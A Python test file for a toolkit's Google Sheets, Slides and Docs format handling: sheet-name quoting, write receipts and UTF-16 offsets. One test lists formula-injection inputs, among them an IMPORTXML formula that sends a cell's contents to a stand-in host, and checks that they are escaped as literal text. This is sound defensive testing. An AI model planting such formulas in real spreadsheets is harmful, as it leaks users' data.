"""Google Docs, Sheets and Slides formats: what the Google modules alone decide.

Moved from the plugin's formats tests; the cases that reach the toolkit or the
Feishu modules move with those.
"""
from __future__ import annotations

import pytest

from jiuwenswarm.clouddoc.providers.base import ProviderError


def test_a_grouped_text_box_is_not_lost():
    """Slides can nest shapes in groups; text inside one is still text a comment can
    quote, so the walk has to descend into them.
    """
    from jiuwenswarm.clouddoc.providers.google.formats import _shapes_of

    page = {
        "pageElements": [
            {"elementGroup": {"children": [
                {"objectId": "inner", "shape": {"text": {"textElements": [
                    {"textRun": {"content": "buried"}}
                ]}}}
            ]}}
        ]
    }
    assert [s.text for s in _shapes_of(page, "p1", notes=False)] == ["buried"]


def test_no_format_claims_a_lock_it_does_not_have():
    """C9. A spreadsheet has no write precondition available at all -- measured, its
    API carries no revision id anywhere -- and a handler that compensates still says
    False, because admission reads this flag to decide whether concurrency is
    protected.
    """
    from jiuwenswarm.clouddoc.providers.google.formats import TRAITS

    assert TRAITS["spreadsheet"].has_revision_control is False
    assert TRAITS["presentation"].has_revision_control is True
    assert TRAITS["document"].has_revision_control is True


def test_a_sheet_name_needing_quotes_gets_them():
    """A1 notation rejects an unquoted title with a space, and the request fails for the
    whole spreadsheet rather than for that sheet -- so a workbook with a "Q3 Data" tab
    could not be read at all.
    """
    from jiuwenswarm.clouddoc.providers.google.formats import (
        _quote_sheet,
    )

    assert _quote_sheet("Sheet1") == "Sheet1"
    assert _quote_sheet("Q3 Data") == "'Q3 Data'"
    assert _quote_sheet("Bob's") == "'Bob''s'"
    assert _quote_sheet("2024") == "'2024'"


@pytest.mark.parametrize("title", ["A1", "ab12", "R1C1", "RC", "C5", "R"])
def test_a_title_that_reads_as_a_cell_is_quoted(title):
    """Unquoted, ``A1!B2`` leaves the platform to decide whether A1 is a sheet."""
    from jiuwenswarm.clouddoc.providers.google.formats import _quote_sheet

    assert _quote_sheet(title) == f"'{title}'"


def test_a_cell_address_carries_the_quoting_the_write_needs():
    """The address goes straight back out as the write's A1 range, so a title needing
    quotes would read fine and then fail on write.
    """
    from jiuwenswarm.clouddoc.providers.textmap import Cell, flatten_grid
    from jiuwenswarm.clouddoc.providers.google.formats import _quote_sheet

    addr = f"{_quote_sheet('Q3 Data')}!A1"
    _, segs = flatten_grid([[Cell(address=addr, formatted="x", formula="x")]])
    assert segs[0].address == "'Q3 Data'!A1"


# ------------------------- a write never creates a formula


@pytest.mark.parametrize(
    "value, sent",
    [
        ('=IMPORTXML("https://x.example/?q="&A1, "//a")', '\'=IMPORTXML("https://x.example/?q="&A1, "//a")'),
        ("+HYPERLINK(B2)", "'+HYPERLINK(B2)"),
        ("-- 待定 --", "'-- 待定 --"),
        ("@sum", "'@sum"),
        ("'quoted", "''quoted"),
        ("-5", "-5"),
        ("+3.5%", "+3.5%"),
        ("1,234", "1,234"),
        ("Q3 收入", "Q3 收入"),
        ("", ""),
    ],
)
def test_a_value_that_would_parse_as_a_formula_is_sent_as_text(value, sent):
    """USER_ENTERED keeps numbers numeric, and would also turn a leading ``=`` into a
    formula that runs when the sheet opens. Overwriting a formula is refused (IC-7);
    creating one must not be possible either.
    """
    from jiuwenswarm.clouddoc.providers.google.formats import _as_literal

    assert _as_literal(value) == sent


@pytest.mark.asyncio
async def test_the_cell_write_sends_the_literal_form():
    from jiuwenswarm.clouddoc.providers import textmap
    from jiuwenswarm.clouddoc.providers.base import DocSnapshot
    from jiuwenswarm.clouddoc.providers.google.formats import write_spreadsheet

    text, segs = textmap.flatten_grid(
        [[textmap.Cell(address="S!A1", formatted="合计", formula="合计")]]
    )
    snap = DocSnapshot(doc_id="d", kind="spreadsheet", revision_id=None, text=text,
                       segments=segs)
    sent = {}

    class _Values:
        def values(self):
            return self

        def spreadsheets(self):
            return self

        def batchUpdate(self, **kw):  # noqa: N802 - the SDK's own spelling
            sent.update(kw)
            return self

        def execute(self):
            return {}

    class _Prov:
        receipt_sink = None

        def receipt_begin(self, *a, **k):
            return "r1"

        def receipt_commit(self, *a, **k):
            pass

        def receipt_abort(self, *a, **k):  # pragma: no cover - not this path
            raise AssertionError("a successful write must not abort")

        def sheets_client(self):
            return _Values()

        async def call_api(self, fn):
            return fn()

    out = await write_spreadsheet(_Prov(), "d", snap, [("合计", "=1+1")], None)

    assert out.status == "applied"
    assert sent["body"]["data"][0]["values"] == [["'=1+1"]], "写入内容不应成为公式"


class _AnyCall:
    """A Sheets or Slides client whose every builder returns itself."""

    def __getattr__(self, name):
        return lambda *a, **k: self

    def execute(self):  # pragma: no cover - the call is replaced
        return {}


def _failing_writer_prov(kind: str, closed: list):
    class _Prov:
        receipt_sink = None

        def receipt_begin(self, *a, **k):
            return "r1"

        def receipt_commit(self, rid, *a, **k):
            closed.append(("commit", rid))

        def receipt_abort(self, rid, reason):
            closed.append(("abort", rid))

        def sheets_client(self):
            return _AnyCall()

        def slides_client(self):
            return _AnyCall()

        async def call_api(self, fn):
            raise ProviderError(kind, "the platform call failed")

    return _Prov()


def _sheet_snapshot():
    from jiuwenswarm.clouddoc.providers import textmap
    from jiuwenswarm.clouddoc.providers.base import DocSnapshot

    text, segs = textmap.flatten_grid(
        [[textmap.Cell(address="S!A1", formatted="合计", formula="合计")]]
    )
    return DocSnapshot(doc_id="d", kind="spreadsheet", revision_id=None, text=text,
                       segments=segs)


def _deck_snapshot():
    from jiuwenswarm.clouddoc.providers import textmap
    from jiuwenswarm.clouddoc.providers.base import DocSnapshot

    text, segs = textmap.flatten_slides(
        [("p1", [textmap.Shape(page_id="p1", object_id="s1", text="旧标题")])]
    )
    return DocSnapshot(doc_id="d", kind="presentation", revision_id="rev", text=text,
                       segments=segs)


async def _write_sheet(prov):
    from jiuwenswarm.clouddoc.providers.google.formats import write_spreadsheet

    return await write_spreadsheet(prov, "d", _sheet_snapshot(), [("合计", "小计")], None)


async def _write_deck(prov):
    from jiuwenswarm.clouddoc.providers.google.formats import write_presentation

    return await write_presentation(prov, "d", _deck_snapshot(), [("旧标题", "新标题")], "rev")


@pytest.mark.asyncio
@pytest.mark.parametrize("write", [_write_sheet, _write_deck], ids=["sheet", "deck"])
@pytest.mark.parametrize("kind", ["transport", "unknown"])
async def test_a_write_whose_outcome_is_unknown_leaves_its_receipt_pending(write, kind):
    """IC-3 on the sheet and deck writers, as on the document path: a timeout or a
    dropped connection may have landed, so the receipt is neither aborted nor
    committed, and the sweep settles it.
    """
    closed = []
    with pytest.raises(ProviderError):
        await write(_failing_writer_prov(kind, closed))
    assert closed == [], "结果未知时回执必须保持待定，交给 sweep 裁定"


@pytest.mark.asyncio
@pytest.mark.parametrize("write", [_write_sheet, _write_deck], ids=["sheet", "deck"])
@pytest.mark.parametrize("kind", ["forbidden", "invalid"])
async def test_a_write_the_platform_refused_aborts_its_receipt(write, kind):
    closed = []
    with pytest.raises(ProviderError):
        await write(_failing_writer_prov(kind, closed))
    assert closed == [("abort", "r1")]


# ---------------------------------------------------------------- reading a workbook


class _Workbook:
    """A Sheets client that answers ``get`` and ``values.batchGet`` from fixed data and
    records the ranges it was asked for.
    """

    def __init__(self, titles, returned):
        self.titles = titles
        self.returned = returned  # render option -> list of valueRanges
        self.asked = []
        self._next = None

    def spreadsheets(self):
        return self

    def values(self):
        return self

    def get(self, **kw):
        self._next = {"sheets": [{"properties": {"title": t}} for t in self.titles]}
        return self

    def batchGet(self, **kw):  # noqa: N802 - the SDK's own spelling
        self.asked.append(kw["ranges"])
        self._next = {"valueRanges": self.returned[kw["valueRenderOption"]]}
        return self

    def execute(self):
        return self._next


async def _read_workbook(titles, returned):
    from jiuwenswarm.clouddoc.providers.google.formats import read_spreadsheet

    book = _Workbook(titles, returned)

    class _Prov:
        def sheets_client(self):
            return book

        async def call_api(self, fn):
            return fn()

    return book, await read_spreadsheet(_Prov(), "d")


@pytest.mark.asyncio
async def test_every_whole_sheet_read_names_the_sheet_unambiguously():
    """Bare, ``A1`` is a cell on the first sheet and ``Sheet1`` loses to a named range
    of that name; quoted, each can only mean the tab.
    """
    ranges = [
        {"range": "'A1'!A1:B1", "values": [["x", "y"]]},
        {"range": "Sheet1!A1:A1", "values": [["z"]]},
    ]
    book, snap = await _read_workbook(
        ["A1", "Sheet1"], {"FORMATTED_VALUE": ranges, "FORMULA": ranges}
    )

    assert book.asked == [["'A1'", "'Sheet1'"]] * 2
    assert [s.address for s in snap.segments] == ["'A1'!A1", "'A1'!B1", "Sheet1!A1"]


@pytest.mark.asyncio
async def test_cells_are_labelled_from_the_range_the_platform_returned():
    """A value is placed where the response says it is, not counted from A1."""
    shown = [{"range": "S!C3:D4", "values": [["a", "b"], [], ]}]
    stored = [{"range": "S!C3:D4", "values": [["a", "=1+1"]]}]
    _, snap = await _read_workbook(["S"], {"FORMATTED_VALUE": shown, "FORMULA": stored})

    by_addr = {s.address: snap.text[s.char_start: s.char_end] for s in snap.segments}
    assert by_addr == {"S!C3": "a", "S!D3": "b"}
    assert [s.address for s in snap.segments if s.readonly_reason] == ["S!D3"]


# ---------------------------------------------------------------- deck coordinates


async def _deck_requests(shape_text, edits):
    from jiuwenswarm.clouddoc.providers import textmap
    from jiuwenswarm.clouddoc.providers.base import DocSnapshot
    from jiuwenswarm.clouddoc.providers.google.formats import write_presentation

    text, segs = textmap.flatten_slides(
        [("p1", [textmap.Shape(page_id="p1", object_id="s1", text=shape_text)])]
    )
    snap = DocSnapshot(doc_id="d", kind="presentation", revision_id="rev", text=text,
                       segments=segs)
    sent = {}

    class _Slides:
        def presentations(self):
            return self

        def batchUpdate(self, **kw):  # noqa: N802 - the SDK's own spelling
            sent.update(kw)
            return self

        def execute(self):
            return {}

    class _Prov:
        receipt_sink = None

        def receipt_begin(self, *a, **k):
            return "r1"

        def receipt_commit(self, *a, **k):
            pass

        def slides_client(self):
            return _Slides()

        async def call_api(self, fn):
            return fn()

    await write_presentation(_Prov(), "d", snap, edits, "rev")
    out = []
    for r in sent["body"]["requests"]:
        if "deleteText" in r:
            rng = r["deleteText"]["textRange"]
            out.append(("delete", rng["startIndex"], rng["endIndex"]))
        else:
            out.append(("insert", r["insertText"]["insertionIndex"], r["insertText"]["text"]))
    return out


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "shape_text,edits,want",
    [
        # An emoji before the target is two units, not one.
        ("😀aTARGET\n", [("TARGET", "NEW")], [("delete", 3, 9), ("insert", 3, "NEW")]),
        # An emoji inside the target widens the range it deletes.
        ("ab😀y\n", [("😀y", "z")], [("delete", 2, 5), ("insert", 2, "z")]),
        # Two edits in one shape, sent back to front, each converted on its own.
        (
            "😀A 😀B\n",
            [("A", "1"), ("B", "2")],
            [("delete", 6, 7), ("insert", 6, "2"), ("delete", 2, 3), ("insert", 2, "1")],
        ),
    ],
    ids=["before", "inside", "two-in-one-shape"],
)
async def test_deck_edits_are_sent_in_utf16_units(shape_text, edits, want):
    """The planner counts code points and the Slides API counts UTF-16 units. Sent
    unconverted, an emoji before the target moves the edit one place left, onto text
    nobody approved -- and the revision pin cannot catch it.
    """
    assert await _deck_requests(shape_text, edits) == want


def test_a_slide_number_in_a_shape_is_read_so_later_offsets_hold():
    """Auto text occupies indices like a run does; leaving it out of the read would
    shift every offset after it.
    """
    from jiuwenswarm.clouddoc.providers.google.formats import _shapes_of

    page = {"pageElements": [{"objectId": "s1", "shape": {"text": {"textElements": [
        {"paragraphMarker": {}},
        {"autoText": {"type": "SLIDE_NUMBER", "content": "3"}},
        {"textRun": {"content": " / 目标\n"}},
    ]}}}]}
    assert [s.text for s in _shapes_of(page, "p1", notes=False)] == ["3 / 目标\n"]
